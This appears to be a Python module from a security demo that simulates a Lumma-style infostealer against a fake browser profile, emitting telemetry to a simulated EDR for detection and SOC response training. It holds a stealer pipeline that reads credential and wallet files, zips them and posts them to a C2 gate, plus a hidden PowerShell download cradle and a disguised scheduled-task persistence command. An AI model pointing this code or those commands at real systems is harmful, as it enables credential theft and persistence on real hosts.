"""LummaSimulator agent — a CONTAINED simulation of a Lumma-style infostealer.

What the real Lumma stealer does on an endpoint:
  1. gets delivered (ClickFix / cracked software / fake updates)
  2. reads browser credential & cookie stores, wallets, chat tokens
  3. packages the loot and exfiltrates it to a C2 gate
  4. cleans up its staging directory
  5. (optionally) establishes persistence

This simulator performs exactly those STEPS — but only ever touching the FAKE
browser profile generated by profile_gen.py inside the demo state directory,
and only ever exfiltrating to the LOCAL demo C2. Every stage emits telemetry
so the (simulated) WithSecure EDR can detect it and the Merlon SOC can respond.

Hard safety properties:
  * refuses to run against anything outside state/endpoint/profile
  * never writes outside state/endpoint
  * all "stolen" data is fake demo data
"""
from __future__ import annotations

import argparse
import json
import shutil
import sys
import time
import zipfile
from pathlib import Path

_HERE = Path(__file__).resolve().parent
for _p in (_HERE, _HERE.parent):
    if str(_p) not in sys.path:
        sys.path.insert(0, str(_p))

import httpx

from agent.profile_gen import PROFILE_ROOT, generate
from common import config
from common.util import now_iso, state_path

STAGING = state_path("endpoint", "staging")

TARGET_HINTS = [
    "Login Data",
    "Local State",
    "Cookies",
    "Web Data",
    "logins.json",
    "cookies.sqlite",
    "vault.json",
    "token.txt",
    "key_datas",
    "screen_01.png",
    "system.txt",
]


def telemetry(category: str, action: str, match: str | None = None, **details) -> None:
    ev = {
        "ts": now_iso(),
        "host": "WS-DEMO-01",
        "category": category,
        "action": action,
        "details": {"match": match, **details} if match else details,
    }
    try:
        httpx.post(f"{config.EDR_URL}/api/telemetry", json=ev, timeout=4.0)
    except httpx.HTTPError as e:
        print(f"[agent] telemetry failed: {e}")


def is_contained() -> bool:
    try:
        r = httpx.get(f"{config.EDR_URL}/api/contained/WS-DEMO-01", timeout=3.0)
        return bool(r.json().get("contained"))
    except Exception:  # noqa: BLE001
        return False


def was_terminated() -> bool:
    try:
        r = httpx.get(f"{config.EDR_URL}/api/terminated/WS-DEMO-01", timeout=3.0)
        return bool(r.json().get("terminated"))
    except Exception:  # noqa: BLE001
        return False


def guard_scope(profile_root: Path) -> Path:
    resolved = profile_root.resolve()
    allowed = PROFILE_ROOT.resolve()
    if not str(resolved).startswith(str(allowed)):
        raise SystemExit(
            f"SAFETY: refusing to operate outside the demo profile dir ({allowed}); got {resolved}"
        )
    return resolved


def run(campaign: str, slow: bool = True, user: str = "alex@northwind.demo") -> None:
    print("=" * 68)
    print(" LUMMA SIMULATOR — contained infostealer simulation")
    print(" Fake data only. Fake profile only. Local C2 only. Demo use only.")
    print("=" * 68)

    profile = guard_scope(generate())

    # ---- stage 0: delivery (ClickFix chain) ------------------------------
    telemetry("process", "powershell.exe spawned", match="download_cradle",
              command="powershell -w hidden -c (New-Object Net.WebClient).DownloadString(...)",
              parent="msedge.exe (ClickFix page)", user=user)
    time.sleep(1.2 if slow else 0)

    if was_terminated():
        print("[agent] process terminated by SOC before staging — good response time!")
        telemetry("process", "lumma_agent.exe terminated", match=None, detail="killed by EDR response")
        return

    # ---- stage 1: discovery ---------------------------------------------
    telemetry("process", "lumma_agent.exe started", match=None, campaign=campaign)
    browsers = [d for d in profile.iterdir() if d.is_dir()]
    print(f"[agent] enumerating {len(browsers)} browser dirs in fake profile")
    time.sleep(0.8 if slow else 0)

    artifacts: list[dict] = []
    cred_reads = 0
    wallet_reads = 0

    for path in sorted(profile.rglob("*")):
        if not path.is_file():
            continue
        rel = str(path.relative_to(profile))
        name = path.name
        is_cred = name in ("Login Data", "Local State", "Cookies", "Web Data", "logins.json", "cookies.sqlite")
        is_wallet = "vault.json" in rel or "token.txt" in name or "key_datas" in name

        artifacts.append(
            {"type": "credentials" if is_cred else ("wallet" if is_wallet else "file"),
             "browser": rel.split("/")[0], "path": rel, "size": path.stat().st_size}
        )
        if is_cred:
            cred_reads += 1
            telemetry("file", f"read {rel}", match="browser_credentials_read",
                      path=rel, engine="Chromium/SQLite (simulated)")
        if is_wallet:
            wallet_reads += 1
            telemetry("file", f"read {rel}", match="wallet_files_read", path=rel)
        time.sleep(0.08 if slow else 0)

    if cred_reads >= 3:
        # (the EDR rule fires on the first credential read; this summary is for the log)
        print(f"[agent] credential stores read: {cred_reads}, wallet/chat artifacts: {wallet_reads}")

    if was_terminated():
        print("[agent] process terminated by SOC mid-collection")
        telemetry("process", "lumma_agent.exe terminated", match=None, detail="killed by EDR response")
        return

    # ---- stage 2: staging ------------------------------------------------
    if STAGING.exists():
        shutil.rmtree(STAGING)
    STAGING.mkdir(parents=True)
    bundle = STAGING / "loot.zip"
    with zipfile.ZipFile(bundle, "w") as zf:
        for path in profile.rglob("*"):
            if path.is_file():
                zf.write(path, str(path.relative_to(profile)))
    print(f"[agent] staged loot bundle: {bundle.stat().st_size} bytes")
    telemetry("file", "created staging bundle", match=None, path=str(bundle), size=bundle.stat().st_size)
    time.sleep(0.7 if slow else 0)

    # ---- stage 3: exfil ----------------------------------------------------
    print("[agent] exfiltrating to C2 /gate.php (local only)")
    # containment check BEFORE exfil — this is the EDR's big moment
    if is_contained():
        print("[agent] BLOCKED: host is contained — exfiltration denied by EDR policy")
        telemetry("network", "exfil blocked by containment", match=None,
                  detail="SOC isolated the host before data left the network")
        return

    try:
        r = httpx.post(
            f"{config.C2_URL}/gate.php",
            json={
                "host": "WS-DEMO-01",
                "campaign": campaign,
                "user": user,
                "summary": f"{len(artifacts)} artifacts, {cred_reads} credential stores, "
                           f"{wallet_reads} wallet/chat items",
                "artifacts": artifacts,
                "bundle_b64": bundle.read_bytes().hex()[:2000] + "…(truncated for demo)",
            },
            timeout=8.0,
        )
        ok = r.status_code == 200
    except httpx.HTTPError as e:
        ok = False
        print(f"[agent] exfil error: {e}")

    telemetry("network", "POST http://c2.lumma-demo.local/gate.php", match="c2_exfil",
              bytes=bundle.stat().st_size, status="200" if ok else "error")
    print(f"[agent] exfil {'complete' if ok else 'FAILED'}")
    time.sleep(0.6 if slow else 0)

    if was_terminated():
        print("[agent] process terminated by SOC after exfil")
        telemetry("process", "lumma_agent.exe terminated", match=None, detail="killed by EDR response")
        return

    # ---- stage 4: anti-forensics -------------------------------------------
    shutil.rmtree(STAGING)
    print("[agent] staging directory removed (anti-forensics)")
    telemetry("file", "deleted staging directory", match="staging_cleanup", path=str(STAGING))

    # ---- stage 5: persistence --------------------------------------------
    telemetry("process", "schtasks /create /tn MicrosoftEdgeUpdate /tr lumma_agent",
              match="persistence_created", detail="scheduled task created (simulated event only)")
    print("[agent] persistence event emitted (simulated — nothing is actually scheduled)")
    print("[agent] done.")


def main() -> None:
    ap = argparse.ArgumentParser(description="Lumma infostealer simulation (contained)")
    ap.add_argument("--campaign", default="demo-aitm")
    ap.add_argument("--user", default="alex@northwind.demo")
    ap.add_argument("--fast", action="store_true", help="no pacing delays")
    args = ap.parse_args()
    run(args.campaign, slow=not args.fast, user=args.user)


if __name__ == "__main__":
    main()
